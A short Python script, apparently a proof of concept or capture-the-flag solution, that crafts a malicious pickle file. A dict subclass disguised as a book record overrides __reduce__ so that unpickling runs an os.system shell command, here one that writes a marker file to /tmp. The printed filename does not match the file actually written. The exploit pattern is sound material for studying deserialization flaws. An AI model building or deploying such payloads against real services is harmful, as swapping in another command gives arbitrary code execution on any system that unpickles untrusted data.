import pickle
import os

# Define a class to mimic a dictionary and execute malicious code
class MaliciousBook(dict):
    def __reduce__(self):
        # This executes arbitrary code upon unpickling
        return (os.system, ('echo "Hacked!" > /tmp/hacked.txt',))

# Create an instance with expected keys
malicious_data = MaliciousBook({
    'title': 'Malicious Book',
    'author': 'Evil Hacker',
    'price': 999,
    'stock': 1,
})

# Serialize the malicious object
with open('yummy_book2.pkl', 'wb') as f:
    pickle.dump(malicious_data, f)

print("Malicious pickle file created: malicious_book.pkl")